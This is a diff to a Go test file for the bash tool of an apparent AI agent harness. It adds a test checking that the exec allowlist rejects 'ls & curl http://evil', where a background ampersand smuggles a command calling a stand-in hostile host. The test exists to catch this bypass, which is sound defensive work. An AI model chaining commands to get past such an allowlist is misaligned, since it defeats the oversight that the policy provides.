@@ -1,12 +1,47 @@
 package bash
 
 import (
+	"context"
+	"encoding/json"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
+
 	"github.com/sausheong/harness/tool"
 )
+
+// runAllowlist executes cmd under an allowlist policy and returns the
+// ToolResult.Error (empty string = the command was permitted by policy).
+func runAllowlist(t *testing.T, allow []string, command string) string {
+	t.Helper()
+	bt := &BashTool{ExecPolicy: &ExecPolicy{Level: "allowlist", Allowlist: allow}}
+	in, err := json.Marshal(bashInput{Command: command})
+	if err != nil {
+		t.Fatalf("marshal: %v", err)
+	}
+	res, err := bt.Execute(context.Background(), in)
+	if err != nil {
+		t.Fatalf("Execute returned a Go error (should use ToolResult.Error): %v", err)
+	}
+	return res.Error
+}
+
+func TestExtractCommands_BackgroundAmpersand(t *testing.T) {
+	// "ls & curl ..." must validate BOTH sides; curl is not allowed →
+	// rejected by policy BEFORE any command executes. Asserting the policy
+	// rejection message (not just a non-empty Error) is essential: without
+	// the fix, curl actually runs and its own runtime stderr lands in
+	// res.Error, which would mask the bypass.
+	got := runAllowlist(t, []string{"ls"}, "ls & curl http://evil")
+	if !strings.Contains(got, "not in the exec allowlist") {
+		t.Fatalf("background-& bypass: expected allowlist rejection of curl, got %q", got)
+	}
+	// "ls && echo hi" must still split on && (both allowed) → permitted.
+	if got := runAllowlist(t, []string{"ls", "echo"}, "ls && echo hi"); got != "" {
+		t.Fatalf("&& chain wrongly rejected: %q", got)
+	}
+}
 
 func TestSanitizeLLMText(t *testing.T) {
 	tests := []struct {
